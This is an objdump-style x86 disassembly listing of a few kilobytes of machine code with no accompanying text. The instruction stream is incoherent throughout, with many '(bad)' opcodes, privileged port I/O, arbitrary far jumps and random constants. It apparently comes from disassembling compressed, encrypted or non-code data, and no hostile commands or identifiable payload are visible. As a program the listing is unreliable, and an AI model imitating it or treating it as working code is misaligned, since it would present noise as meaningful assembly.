  413f87:	adc    DWORD PTR [edi],eax
  413f89:	call   0x7d9f83c
  413f8e:	mov    edx,0xd04870c0
  413f93:	mov    bh,0xe9
  413f95:	jge    0x413f58
  413f97:	stos   BYTE PTR es:[edi],al
  413f98:	add    al,BYTE PTR [edi+0x4d]
  413f9b:	lea    ebx,[esi]
  413f9d:	stos   DWORD PTR es:[edi],eax
  413f9e:	jl     0x414017
  413fa0:	popa   
  413fa1:	xchg   edx,eax
  413fa2:	adc    eax,0x77f82a3b
  413fa7:	or     ecx,DWORD PTR [ebx]
  413fa9:	icebp  
  413faa:	ja     0x413f69
  413fac:	sbb    dh,BYTE PTR [ecx-0x15]
  413faf:	xchg   edx,eax
  413fb0:	mov    ebp,0x66039449
  413fb5:	std    
  413fb6:	sub    BYTE PTR [edi],ah
  413fb8:	dec    ebp
  413fb9:	inc    edx
  413fba:	xchg   edi,eax
  413fbb:	stos   BYTE PTR es:[edi],al
  413fbc:	jbe    0x414007
  413fbe:	or     dl,BYTE PTR [ebx]
  413fc0:	mov    DWORD PTR [edi-0x19],ecx
  413fc3:	ins    DWORD PTR es:[edi],dx
  413fc4:	in     al,dx
  413fc5:	pop    ds
  413fc6:	aad    0x6b
  413fc8:	repz (bad) 
  413fca:	jp     0x413fd5
  413fcc:	mov    ch,0x5
  413fce:	adc    DWORD PTR [esi],edi
  413fd0:	xor    ch,0x35
  413fd3:	push   esi
  413fd4:	mov    al,0x30
  413fd6:	add    al,0xae
  413fd8:	inc    ebx
  413fd9:	push   ds
  413fda:	xor    dl,BYTE PTR [ebp+0x1ad10399]
  413fe0:	in     eax,0x46
  413fe2:	mov    ds:0xb1c205ab,al
  413fe7:	jb     0x41402e
  413fe9:	pop    ebx
  413fea:	xchg   edi,eax
  413feb:	sub    eax,0xa248caf3
  413ff0:	mov    edx,0xa168b4c6
  413ff5:	or     edi,DWORD PTR [esp-0x8]
  413ff9:	push   esi
  413ffa:	or     esp,esi
  413ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ffd:	jne    0x413fe3
  413fff:	cs dec ebx
  414001:	inc    BYTE PTR [esi-0x3a]
  414004:	nop
  414005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414006:	mov    esp,0x15ace15d
  41400b:	xor    edi,esp
  41400d:	(bad)  
  41400f:	imul   edi,edx,0x74ed25fc
  414015:	sahf   
  414016:	mov    ecx,0x73736aac
  41401b:	mov    bl,BYTE PTR [eax]
  41401d:	out    dx,al
  41401e:	hlt    
  41401f:	shl    DWORD PTR [ebx-0x3c],0xbf
  414023:	pop    ss
  414024:	imul   edi,DWORD PTR [ecx+0x12],0xffffffec
  414028:	and    bl,BYTE PTR [ebp-0x32901b2e]
  41402e:	enter  0xc2c4,0xf3
  414032:	shr    BYTE PTR [edx+0xa],cl
  414035:	adc    dh,BYTE PTR ds:0xd89c5965
  41403b:	psrlw  mm2,QWORD PTR [ecx-0x7133724]
  414042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414043:	ja     0x414059
  414045:	in     al,0xf5
  414047:	push   ebx
  414048:	mul    DWORD PTR [ebx-0x58]
  41404b:	sahf   
  41404c:	or     ebp,DWORD PTR [ebp-0x58387ff6]
  414052:	inc    ebx
  414053:	adc    eax,DWORD PTR [edx-0x42]
  414056:	idiv   cl
  414058:	sub    bh,BYTE PTR [edx]
  41405a:	mov    dl,0x20
  41405c:	addr16 ds xchg ecx,ebp
  414060:	jae    0x414025
  414062:	jns    0x41404a
  414064:	dec    edi
  414065:	and    ah,BYTE PTR [edx]
  414067:	pop    ds
  414068:	jae    0x4140d4
  41406a:	and    al,0x9f
  41406c:	xchg   ecx,eax
  41406d:	ds dec edx
  41406f:	cmp    dh,BYTE PTR [edi-0x50]
  414072:	add    DWORD PTR [ecx+0x71],esi
  414075:	scas   eax,DWORD PTR es:[edi]
  414076:	push   esp
  414077:	pushf  
  414078:	pop    ebx
  414079:	adc    eax,0x487d6965
  41407e:	jbe    0x414090
  414080:	retf   
  414081:	mov    esi,0xbc0fe236
  414086:	sub    ebx,ecx
  414088:	out    0x9c,al
  41408a:	into   
  41408b:	xchg   ecx,eax
  41408c:	retf   
  41408d:	repz add edx,edi
  414090:	idiv   BYTE PTR [esp+eax*8+0x1b]
  414094:	addr16 int3 
  414096:	mov    edi,0xe559caab
  41409b:	test   al,0x86
  41409d:	je     0x4140f0
  41409f:	add    dh,cl
  4140a1:	xchg   edx,eax
  4140a2:	shr    BYTE PTR [eax-0x6c],1
  4140a5:	jne    0x4140e5
  4140a7:	adc    DWORD PTR [esi],0xffffffb8
  4140aa:	sub    BYTE PTR [ecx],cl
  4140ac:	and    dl,BYTE PTR [ebx+0x100b4fc6]
  4140b2:	sbb    DWORD PTR [ebp-0x38],ebp
  4140b5:	cmp    eax,DWORD PTR [edi]
  4140b7:	call   0xd3c4f155
  4140bc:	pop    esi
  4140bd:	in     eax,dx
  4140be:	idiv   DWORD PTR [ebp+0x10]
  4140c1:	test   eax,0x45b845d5
  4140c6:	mov    ebx,0x674def0b
  4140cb:	inc    ebp
  4140cc:	jmp    0xdc7a:0x4ac61cf6
  4140d3:	shl    dl,0x68
  4140d6:	loope  0x41411f
  4140d8:	sub    eax,edi
  4140da:	pop    esi
  4140db:	and    ah,BYTE PTR [ecx]
  4140dd:	inc    eax
  4140de:	cli    
  4140df:	cmp    cl,BYTE PTR [ebp-0x9]
  4140e2:	mov    ebx,ecx
  4140e4:	mov    ch,0x61
  4140e6:	push   eax
  4140e7:	add    BYTE PTR [ebp+0x4f],ch
  4140ea:	cli    
  4140eb:	pop    esp
  4140ec:	rol    DWORD PTR [ecx],1
  4140ee:	and    esp,DWORD PTR [edi+0x49]
  4140f1:	fld    QWORD PTR [eax+eax*1]
  4140f4:	jl     0x41408b
  4140f6:	or     ebp,DWORD PTR [esi+0x46]
  4140f9:	dec    edi
  4140fa:	inc    edi
  4140fb:	outs   dx,DWORD PTR ds:[esi]
  4140fc:	add    eax,0x8338d962
  414101:	in     al,0xfc
  414103:	shl    DWORD PTR [esi+0x4e],cl
  414106:	loopne 0x4140de
  414108:	in     al,dx
  414109:	adc    BYTE PTR [ecx],dh
  41410b:	push   ds
  41410c:	inc    ebp
  41410d:	mov    ebx,0x83c7b3e3
  414112:	push   eax
  414113:	cwde   
  414114:	inc    edi
  414115:	cmp    al,0x54
  414117:	mov    WORD PTR [ebx-0x6d658232],ss
  41411d:	and    esp,esi
  41411f:	cli    
  414120:	xchg   esi,eax
  414121:	in     eax,0x86
  414123:	cmp    al,0x1d
  414125:	add    DWORD PTR [edi-0x4],edi
  414128:	in     eax,dx
  414129:	lods   al,BYTE PTR ds:[esi]
  41412a:	cmc    
  41412b:	jmp    0x2784:0x6db279a6
  414132:	mov    WORD PTR [esi],?
  414134:	push   cs
  414135:	dec    edx
  414136:	cmp    cl,BYTE PTR [ecx-0x4bb313d9]
  41413c:	fs js  0x41418a
  41413f:	xor    eax,0xfa5aed31
  414144:	ss clc 
  414146:	mov    es,WORD PTR [esi]
  414148:	nop
  414149:	inc    edx
  41414a:	cmp    al,0x89
  41414c:	fld    DWORD PTR [ecx+0x1a4169c2]
  414152:	jle    0x414135
  414154:	xchg   ecx,eax
  414155:	or     eax,0x24dca1b4
  41415a:	push   esi
  41415b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41415c:	int3   
  41415d:	jge    0x414152
  41415f:	add    BYTE PTR [esi+0x6bfeeb90],0xb3
  414166:	scas   al,BYTE PTR es:[edi]
  414167:	jge    0x4141dc
  414169:	cmc    
  41416a:	or     al,0x76
  41416c:	mov    ch,0x8f
  41416e:	dec    ebp
  41416f:	add    DWORD PTR [esi+0x2e],esp
  414172:	sbb    cl,ch
  414174:	push   0x9f941b6d
  414179:	icebp  
  41417a:	dec    edx
  41417b:	ds pop esi
  41417d:	pop    edx
  41417e:	loope  0x414159
  414180:	retf   
  414181:	hlt    
  414182:	mov    cl,0xe
  414184:	ins    DWORD PTR es:[edi],dx
  414185:	fild   WORD PTR [esi+0x21]
  414188:	inc    ebp
  414189:	or     ebp,DWORD PTR [ebx]
  41418b:	fld    QWORD PTR [ebx-0x45287f10]
  414191:	mov    ebx,0xbf4cab4f
  414196:	xchg   esi,eax
  414197:	arpl   WORD PTR [esi],ax
  414199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41419a:	mov    ebp,0x612c628
  41419f:	cmp    al,0xe0
  4141a1:	sbb    BYTE PTR ds:0x46788934,ch
  4141a7:	push   esi
  4141a8:	dec    edi
  4141a9:	sub    edx,esp
  4141ab:	cdq    
  4141ac:	cmp    bh,BYTE PTR [eax-0x39c07ce5]
  4141b2:	jl     0x414144
  4141b4:	outs   dx,BYTE PTR ds:[esi]
  4141b5:	push   esi
  4141b6:	push   edi
  4141b7:	pop    eax
  4141b8:	xor    bh,cl
  4141ba:	cs jg  0x4141b1
  4141bd:	test   al,bl
  4141bf:	stc    
  4141c0:	pop    ds
  4141c1:	dec    ecx
  4141c2:	push   ecx
  4141c3:	pushf  
  4141c4:	mov    ds:0x31e09051,eax
  4141c9:	ret    
  4141ca:	pop    ecx
  4141cb:	jnp    0x414217
  4141cd:	mov    esi,0xd7506e52
  4141d2:	stc    
  4141d3:	sub    esp,DWORD PTR [ecx+eax*1-0x3cb79316]
  4141da:	xchg   esi,eax
  4141db:	aas    
  4141dc:	sbb    eax,0x6bf8eca4
  4141e1:	mov    dh,0x54
  4141e3:	inc    ebx
  4141e4:	push   ds
  4141e5:	adc    BYTE PTR [eax+edi*8],al
  4141e8:	dec    ebp
  4141e9:	repz test DWORD PTR [eax-0x1e488389],ecx
  4141f0:	and    DWORD PTR [esi+0x7f38d297],ebp
  4141f6:	in     eax,dx
  4141f7:	and    DWORD PTR [ecx+0x1c],ebx
  4141fa:	xchg   BYTE PTR [edi-0x690556f6],dh
  414200:	mov    ds:0x485a2433,al
  414205:	cld    
  414206:	fld    TBYTE PTR [edi]
  414208:	pop    es
  414209:	mov    dh,0x7a
  41420b:	cdq    
  41420c:	push   0xffffffd6
  41420e:	inc    ebp
  41420f:	sub    dh,BYTE PTR fs:[eax-0x38]
  414213:	dec    esp
  414214:	leave  
  414215:	repz ss push 0x8d8d5656
  41421c:	cwde   
  41421d:	test   BYTE PTR [edi],al
  41421f:	and    al,bh
  414221:	ins    DWORD PTR es:[edi],dx
  414222:	jbe    0x414263
  414224:	loope  0x41420e
  414226:	jae    0x4141ad
  414228:	seta   BYTE PTR [ebx-0x29]
  41422c:	jle    0x414277
  41422e:	lahf   
  41422f:	out    0x5,eax
  414231:	push   ss
  414232:	test   ch,bl
  414234:	mov    bl,0x5b
  414236:	dec    esp
  414237:	push   esi
  414238:	ror    DWORD PTR [ebp+0xe18f4bf],cl
  41423e:	mov    dh,dh
  414240:	out    0xb0,al
  414242:	add    eax,0x41a3b4e9
  414247:	and    al,0x77
  414249:	jbe    0x4142b2
  41424b:	mov    ah,0x73
  41424d:	(bad)  
  41424e:	push   ebx
  41424f:	sbb    esp,ecx
  414251:	popf   
  414252:	(bad)  
  414253:	fwait
  414254:	xchg   esp,eax
  414255:	jecxz  0x414215
  414257:	and    al,0x11
  414259:	int3   
  41425a:	stos   BYTE PTR es:[edi],al
  41425b:	cmp    edx,DWORD PTR [eax+0x6c]
  41425e:	inc    edx
  41425f:	addr16 or bl,dh
  414262:	in     eax,0xe8
  414264:	arpl   WORD PTR [edx+ecx*1],di
  414267:	cmp    al,0x42
  414269:	mov    edi,0x282bce12
  41426e:	std    
  41426f:	(bad)  
  414270:	fcmovnb st,st(0)
  414272:	mov    ecx,0xe603f8fc
  414277:	push   0x5da561f1
  41427c:	mov    eax,ds:0x3e87f576
  414281:	(bad)  
  414282:	jae    0x4142d7
  414284:	retf   
  414285:	test   al,0x8a
  414287:	fisttp DWORD PTR [edi+ebp*2+0x70]
  41428b:	xor    DWORD PTR [eax],esp
  41428d:	sar    DWORD PTR [edi-0x32],0x84
  414291:	ret    
  414292:	push   DWORD PTR [edi+0xc]
  414295:	pop    ebx
  414296:	and    DWORD PTR [edx+0x1ca53cba],ecx
  41429c:	shr    BYTE PTR [esi],0x3f
  41429f:	mov    ds,WORD PTR [edi-0x7fbe4cb1]
  4142a5:	(bad)  
  4142a6:	jg     0x4142f8
  4142a8:	aaa    
  4142a9:	mov    ecx,0xa92fc64f
  4142ae:	sbb    DWORD PTR [edx-0x2614b385],0xfffffff4
  4142b5:	es sahf 
  4142b7:	out    dx,al
  4142b8:	div    DWORD PTR [eax-0x26]
  4142bb:	ret    0x7828
  4142be:	cli    
  4142bf:	and    eax,0x73e2ae51
  4142c4:	jl     0x41424c
  4142c6:	pop    es
  4142c7:	push   edx
  4142c8:	retf   0xae41
  4142cb:	jmp    0x2021:0xd4acdf96
  4142d2:	imul   ecx,DWORD PTR ds:0xfcb2a93c,0x72
  4142d9:	jg     0x41425d
  4142db:	or     al,0x49
  4142dd:	imul   DWORD PTR ds:0x9a0a5f1c
  4142e3:	mov    WORD PTR [ecx+eiz*2+0x238b9e91],cs
  4142ea:	push   0xf001522b
  4142ef:	mov    al,0x1e
  4142f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f2:	adc    eax,0x854f82c2
  4142f7:	retf   
  4142f8:	lods   al,BYTE PTR ds:[esi]
  4142f9:	sar    DWORD PTR [ebp-0x27d7af9c],cl
  4142ff:	aam    0x1d
  414301:	fist   WORD PTR ds:0x7f44aa3
  414307:	jb     0x41436c
  414309:	popa   
  41430a:	shl    BYTE PTR [eax+eax*4],1
  41430d:	mov    dh,0x90
  41430f:	sub    al,bl
  414311:	outs   dx,DWORD PTR ds:[esi]
  414312:	xor    DWORD PTR [eax+0x28012921],0xe8ef1cc1
  41431c:	adc    edx,ecx
  41431e:	cmp    BYTE PTR [ebx-0x55],ah
  414321:	and    BYTE PTR [esi-0x2],0x15
  414325:	es ret 
  414327:	call   DWORD PTR [ebp+0xa]
  41432a:	xlat   BYTE PTR ds:[ebx]
  41432b:	mov    al,0x84
  41432d:	(bad)  
  41432f:	push   eax
  414330:	ss pop ebx
  414332:	and    dh,0x25
  414335:	dec    edx
  414336:	cdq    
  414337:	dec    edx
  414338:	arpl   WORD PTR [ebx-0x1347fdfd],bx
  41433e:	shr    edi,1
  414340:	test   edx,esp
  414342:	outs   dx,BYTE PTR ds:[esi]
  414343:	inc    ebx
  414344:	in     al,dx
  414345:	add    al,0x6a
  414347:	pop    ebx
  414348:	scas   al,BYTE PTR es:[edi]
  414349:	retf   0xe51c
  41434c:	in     al,0xbd
  41434e:	jnp    0x41438c
  414350:	(bad)  
  414351:	ss push cs
  414353:	loope  0x414392
  414355:	daa    
  414356:	je     0x4143cd
  414358:	ins    DWORD PTR es:[edi],dx
  414359:	adc    ebx,DWORD PTR [ebx+0x3a99fe80]
  41435f:	dec    ebp
  414360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414361:	aam    0x1
  414363:	pop    esi
  414364:	int    0xb3
  414366:	cld    
  414367:	jecxz  0x41432b
  414369:	jmp    0x414326
  41436b:	sbb    al,BYTE PTR [ebx-0xa]
  41436e:	in     eax,dx
  41436f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414370:	mov    al,ds:0x4cdbf352
  414375:	cmp    eax,0x4561a13
  41437a:	in     eax,0xae
  41437c:	sub    edi,DWORD PTR [ebx+0x9]
  41437f:	sub    dl,0x95
  414382:	xor    ecx,DWORD PTR ds:0x1ed0fc85
  414388:	push   edi
  414389:	inc    eax
  41438a:	test   BYTE PTR [ecx],ah
  41438c:	sub    al,0x74
  41438e:	int3   
  41438f:	mov    cs,WORD PTR [esi+0x7e63a9d0]
  414395:	inc    edi
  414396:	mov    ebp,0x4c77cf5c
  41439b:	push   ds
  41439c:	adc    esi,ecx
  41439e:	aam    0x98
  4143a0:	mov    esp,0xf64f2a6e
  4143a5:	out    0x25,al
  4143a7:	mov    bh,0x6f
  4143a9:	mov    dh,0xec
  4143ab:	das    
  4143ac:	pop    ss
  4143ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ae:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4143b0:	xchg   edx,eax
  4143b1:	cmp    BYTE PTR [ebp-0x3d],bh
  4143b4:	ss jae 0x414417
  4143b7:	imul   edx,DWORD PTR [ebx+0x70],0xa4479504
  4143be:	xor    eax,0x777ad75b
  4143c3:	ss mov ebx,ebp
  4143c6:	mov    dh,BYTE PTR [ebx+eax*1+0x794626de]
  4143cd:	sti    
  4143ce:	das    
  4143cf:	(bad)  
  4143d0:	adc    eax,0xb8e21054
  4143d5:	xchg   esp,eax
  4143d6:	xor    ah,BYTE PTR [edi+0x6a911455]
  4143dc:	loop   0x4143f2
  4143de:	nop
  4143df:	mov    ecx,0xd9981bc
  4143e4:	jno    0x414390
  4143e6:	fdiv   DWORD PTR [ebx-0x80]
  4143e9:	out    0xad,al
  4143eb:	into   
  4143ec:	mov    al,fs:0x6d150016
  4143f2:	cwde   
  4143f3:	loopne 0x414426
  4143f5:	mov    DWORD PTR [eax-0x38],edi
  4143f8:	pushf  
  4143f9:	push   ecx
  4143fa:	sar    edi,cl
  4143fc:	pop    esi
  4143fd:	jo     0x414468
  4143ff:	in     al,0xa4
  414401:	rol    DWORD PTR [ecx+0x3c],0xc7
  414405:	adc    BYTE PTR [edx],0x36
  414408:	ret    
  414409:	fcomp  DWORD PTR [esi-0x72]
  41440c:	and    eax,0xece1c919
  414411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414412:	arpl   WORD PTR [ebp-0x2f2cb548],di
  414418:	push   0x4c119845
  41441d:	(bad)  
  41441e:	sub    bh,cl
  414420:	cdq    
  414421:	aad    0xf8
  414423:	dec    ebp
  414424:	pop    esp
  414425:	pop    es
  414426:	dec    esp
  414427:	dec    edi
  414428:	call   0xc5ad:0xfcb83628
  41442f:	cmp    eax,0x629aa458
  414434:	cmp    al,0x29
  414436:	popa   
  414437:	dec    edi
  414438:	mov    ds:0x52aa8d5c,eax
  41443d:	mov    ebx,0x9eeba57b
  414442:	jmp    0x917693db
  414447:	stos   DWORD PTR es:[edi],eax
  414448:	cdq    
  414449:	pop    ebx
  41444a:	add    DWORD PTR [edx+0x6b],ebx
  41444d:	test   al,0x7c
  41444f:	fisttp WORD PTR [esi-0x5f20ff67]
  414455:	pop    edi
  414456:	shr    BYTE PTR [esi-0x4f],1
  414459:	pop    edx
  41445a:	std    
  41445b:	adc    BYTE PTR ss:[ebp-0x3e0c4e0b],dl
  414462:	push   ebp
  414463:	enter  0x4380,0xf9
  414467:	gs ret 
  414469:	cmp    al,0x52
  41446b:	mov    al,ds:0x9ff20975
  414470:	cwde   
  414471:	cld    
  414472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414473:	hlt    
  414474:	(bad)  
  414475:	out    0xc1,eax
  414477:	jl     0x4144d7
  414479:	std    
  41447a:	mov    ds:0xd173b988,al
  41447f:	int3   
  414480:	sbb    bl,dh
  414482:	push   cs
  414483:	rcl    BYTE PTR [edi+0x4e351a28],0x51
  41448a:	lock lods eax,DWORD PTR ds:[esi]
  41448c:	scas   eax,DWORD PTR es:[edi]
  41448d:	retf   0x90f0
  414490:	jl     0x4144d4
  414492:	xlat   BYTE PTR ds:[ebx]
  414493:	push   es
  414494:	mov    al,0x2d
  414496:	aam    0x27
  414498:	adc    BYTE PTR ds:0xd9bfca62,bl
  41449e:	pop    edi
  41449f:	or     ch,dh
  4144a1:	cmp    al,0x6a
  4144a3:	pusha  
  4144a4:	mov    fs,WORD PTR [ebx*8-0x63968ab3]
  4144ab:	into   
  4144ac:	loopne 0x4144f6
  4144ae:	dec    ebp
  4144af:	test   eax,0x9af7f0c1
  4144b4:	mov    eax,0x9cb9a0a4
  4144b9:	xor    eax,0x77289aed
  4144be:	lock jge 0x41446d
  4144c1:	add    al,0xab
  4144c3:	enter  0xddb4,0x28
  4144c7:	or     bh,BYTE PTR [ebx+0x451a4a76]
  4144cd:	es es or edi,0x61
  4144d2:	dec    edx
  4144d3:	int    0x1c
  4144d5:	jmp    0xcfea20b1
  4144da:	nop
  4144db:	mov    ebp,0x7cba6490
  4144e0:	mov    esp,0x7b6b2b78
  4144e5:	aad    0x8e
  4144e7:	dec    ecx
  4144e8:	sbb    eax,0x721e0db5
  4144ed:	test   al,0x68
  4144ef:	lods   eax,DWORD PTR ds:[esi]
  4144f0:	stos   DWORD PTR es:[edi],eax
  4144f1:	cmp    bl,cl
  4144f3:	imul   ebp,edi,0x4d8dd86d
  4144f9:	das    
  4144fa:	(bad)  
  4144fc:	push   ebp
  4144fd:	push   ecx
  4144fe:	adc    ax,0x8572
  414502:	stc    
  414503:	mov    WORD PTR [edi],?
  414505:	or     bl,ch
  414507:	xchg   esi,eax
  414508:	inc    esp
  414509:	les    ebx,FWORD PTR [eax+0x16]
  41450c:	inc    ebx
  41450d:	scas   eax,DWORD PTR es:[edi]
  41450e:	mov    eax,ds:0xdcaa65b5
  414513:	imul   ecx,DWORD PTR [edi],0x7a4edbd6
  414519:	inc    ecx
  41451a:	mov    eax,0xd2076135
  41451f:	and    al,0x1f
  414521:	push   ebp
  414522:	retf   0x1196
  414525:	sbb    al,0xa5
  414527:	ja     0x41453a
  414529:	cmc    
  41452a:	adc    eax,0x34476b21
  41452f:	pop    ecx
  414530:	out    dx,al
  414531:	ja     0x41454b
  414533:	jnp    0x4144bd
  414535:	dec    eax
  414536:	pop    ecx
  414537:	and    DWORD PTR [edx+ebp*1-0x11bbd764],ebp
  41453e:	aaa    
  41453f:	add    al,0x81
  414541:	data16 ficom DWORD PTR [edx+eiz*2-0x626c0ed5]
  414549:	call   0xe740c569
  41454e:	retf   
  41454f:	(bad)  
  414550:	in     eax,0x60
  414552:	lahf   
  414553:	imul   edx,DWORD PTR [eax+0x9c854ef],0xfffffffb
  41455a:	scas   al,BYTE PTR es:[edi]
  41455b:	arpl   WORD PTR [esi-0x39a5c6a5],dx
  414561:	out    0xd3,eax
  414563:	mov    ch,0xf2
  414565:	mov    esp,0x36072ee9
  41456a:	loop   0x414554
  41456c:	push   edi
  41456d:	loopne 0x4144f3
  41456f:	dec    edx
  414570:	and    DWORD PTR [ebp-0x4],ebx
  414573:	mov    esp,0xdb91411c
  414578:	pop    ds
  414579:	leave  
  41457a:	jno    0x414520
  41457c:	dec    eax
  41457d:	sti    
  41457e:	dec    edi
  41457f:	jns    0x414554
  414581:	jl     0x41453d
  414583:	xchg   ecx,eax
  414584:	gs es dec eax
  414587:	fwait
  414588:	fs stos BYTE PTR es:[edi],al
  41458a:	adc    dl,al
  41458c:	cdq    
  41458d:	or     DWORD PTR ds:0xeb1704f9,edx
  414593:	xor    al,0x34
  414595:	push   0xbf732d55
  41459a:	mov    ss:0x5483eba0,eax
  4145a0:	mov    cl,0xa4
  4145a2:	in     al,0xe3
  4145a4:	xchg   ebx,eax
  4145a5:	repz pushf 
  4145a7:	mov    eax,ds:0xc981c29b
  4145ac:	inc    esp
  4145ad:	ficom  DWORD PTR [ebx]
  4145af:	push   ebx
  4145b0:	jecxz  0x4145e1
  4145b2:	leave  
  4145b3:	and    eax,0x825efa5f
  4145b8:	dec    esp
  4145b9:	lock sbb BYTE PTR [ecx+eiz*8-0x3caa3c8e],0x90
  4145c2:	xchg   ecx,eax
  4145c3:	lods   al,BYTE PTR ds:[esi]
  4145c4:	arpl   WORD PTR [edi-0x3cd758b3],bp
  4145ca:	xor    al,dl
  4145cc:	or     ch,BYTE PTR [eax-0x6275ff86]
  4145d2:	scas   eax,DWORD PTR es:[edi]
  4145d3:	xor    esi,0x1e4dfc57
  4145d9:	ss push eax
  4145db:	mov    al,0x88
  4145dd:	pop    esi
  4145de:	add    BYTE PTR [esi+0x42c48cc0],0x8d
  4145e5:	in     al,dx
  4145e6:	inc    edx
  4145e7:	bound  eax,QWORD PTR [eax+0x74d4ad92]
  4145ed:	xchg   DWORD PTR [ebx+ecx*8],edi
  4145f0:	fs (bad) 
  4145f2:	repz int3 
  4145f4:	sti    
  4145f5:	ror    ch,0xdc
  4145f8:	arpl   WORD PTR [ecx],bp
  4145fa:	inc    esp
  4145fb:	ja     0x414606
  4145fd:	fnstsw WORD PTR [ebx+0x3b]
  414600:	inc    edi
  414601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414602:	jo     0x41464b
  414604:	retf   
  414605:	fcom   DWORD PTR [edi+ebx*4]
  414608:	dec    esp
  414609:	aam    0x9e
  41460b:	adc    eax,0x1560dbb2
  414610:	dec    edx
  414611:	xchg   esp,eax
  414612:	scas   eax,DWORD PTR es:[edi]
  414613:	xchg   ebp,eax
  414614:	out    0xd8,eax
  414616:	clc    
  414617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414618:	mov    bl,0x6b
  41461a:	data16 test BYTE PTR [esi],ch
  41461d:	jmp    0x4145aa
  41461f:	cli    
  414620:	mov    al,ds:0xa0d66a52
  414625:	outs   dx,DWORD PTR ds:[esi]
  414626:	jns    0x4145cb
  414628:	pop    esi
  414629:	xchg   edx,eax
  41462a:	rcl    BYTE PTR [edi+0x716bac],1
  414630:	adc    eax,0xf1e8bae
  414635:	fcom   QWORD PTR [edx-0x6dfdc0f7]
  41463b:	or     ecx,eax
  41463d:	pop    edx
  41463e:	lahf   
  41463f:	push   es
  414640:	pop    eax
  414641:	or     eax,0x2d166ed8
  414646:	add    ah,BYTE PTR [ecx-0x189ca177]
  41464c:	adc    ebx,DWORD PTR [esi+0x717dabcd]
  414652:	push   edi
  414653:	fs imul eax,eax,0xffffffa2
  414657:	xchg   DWORD PTR [ecx],ebx
  414659:	shl    dh,0x66
  41465c:	loop   0x41464b
  41465e:	mov    dl,0x29
  414660:	das    
  414661:	lds    ecx,FWORD PTR [ebp+0x10]
  414664:	cs (bad) 
  414666:	and    BYTE PTR [esi-0x71b2dae9],cl
  41466c:	cld    
  41466d:	cmp    eax,0x54ce0606
  414672:	in     al,0x4b
  414674:	mov    ch,0x8b
  414676:	adc    edx,DWORD PTR [eax+ecx*2+0x16aa052e]
  41467d:	(bad)  [edx]
  41467f:	cli    
  414680:	ins    DWORD PTR es:[edi],dx
  414681:	pop    edi
  414682:	mov    al,0xf7
  414684:	dec    esp
  414685:	mov    bh,0xdd
  414687:	enter  0x354d,0x11
  41468b:	push   edi
  41468c:	jbe    0x4146f4
  41468e:	add    eax,0x1acb79b3
  414693:	jbe    0x41465a
  414695:	mov    esi,ecx
  414697:	clc    
  414698:	pop    esp
  414699:	test   DWORD PTR [esi],ebp
  41469b:	inc    ecx
  41469c:	xlat   BYTE PTR ds:[ebx]
  41469d:	in     eax,0x79
  41469f:	sbb    bh,BYTE PTR [ebx]
  4146a1:	push   cs
  4146a2:	inc    esi
  4146a3:	push   eax
  4146a4:	sahf   
  4146a5:	repnz xchg ebx,eax
  4146a7:	xor    eax,0x5dd77ad7
  4146ac:	pop    edi
  4146ad:	jae    0x41466f
  4146af:	sub    eax,0xc69b4540
  4146b4:	jo     0x4146ed
  4146b6:	cs adc eax,0x987ca778
  4146bc:	in     eax,0x1
  4146be:	nop
  4146bf:	(bad)  [esp-0xc]
  4146c3:	lock repz cmp al,0x63
  4146c7:	data16 sub dh,dh
  4146ca:	pop    ebx
  4146cb:	xchg   ecx,eax
  4146cd:	or     DWORD PTR [esi],0x459db759
  4146d3:	mov    ss,WORD PTR [ebp-0x4ac82c63]
  4146d9:	rcr    ah,1
  4146db:	(bad)  
  4146dc:	(bad)  
  4146dd:	or     ch,ah
  4146df:	xchg   edx,eax
  4146e0:	aad    0x39
  4146e2:	popa   
  4146e3:	fisubr WORD PTR [ebp+0x4]
  4146e6:	pop    esi
  4146e7:	mov    al,0x1c
  4146e9:	cdq    
  4146ea:	adc    cl,BYTE PTR [ecx]
  4146ec:	mov    dh,0x3
  4146ee:	leave  
  4146ef:	jmp    0x4146d7
  4146f1:	sub    bl,0x2
  4146f4:	xor    al,0xfd
  4146f6:	retf   
  4146f7:	stos   BYTE PTR es:[edi],al
  4146f8:	inc    edx
  4146f9:	lods   eax,DWORD PTR ds:[esi]
  4146fa:	mov    DWORD PTR [ecx+0x28b77551],ecx
  414700:	dec    ebx
  414701:	push   esp
  414702:	pop    ds
  414703:	lods   al,BYTE PTR ds:[esi]
  414704:	mov    bh,0x74
  414706:	mov    esp,0x6c0e6ffb
  41470b:	imul   esp,esi,0x228eeeba
  414711:	xor    edi,ecx
  414713:	jae    0x414745
  414715:	enter  0x6ad1,0xac
  414719:	pusha  
  41471a:	shl    dh,1
  41471c:	push   eax
  41471d:	out    0x50,eax
  41471f:	jae    0x414747
  414721:	ins    BYTE PTR es:[edi],dx
  414722:	out    dx,al
  414723:	jne    0x41479c
  414725:	fwait
  414726:	in     eax,0x4a
  414728:	adc    al,0x4b
  41472a:	or     dh,bh
  41472c:	out    dx,al
  41472d:	mov    edi,0x9663e978
  414732:	das    
  414733:	sbb    al,0xb5
  414735:	aas    
  414736:	popf   
  414737:	pop    ebx
  414738:	pop    ebp
  414739:	inc    edx
  41473a:	popf   
  41473b:	mov    dh,0x22
  41473d:	test   eax,0x1285afab
  414742:	push   esi
  414743:	stos   DWORD PTR es:[edi],eax
  414744:	fisttp WORD PTR [ebx+0x3]
  414747:	je     0x414794
  414749:	mov    eax,ds:0xe3491ea0
  41474e:	cmc    
  41474f:	cdq    
  414750:	sbb    al,0x16
  414752:	pusha  
  414753:	adc    al,0x24
  414755:	push   ebp
  414756:	mov    bl,0xf9
  414758:	push   cs
  414759:	sti    
  41475a:	jmp    0x8a608cf3
  41475f:	sbb    BYTE PTR [edx],al
  414761:	mov    eax,0xecce53cc
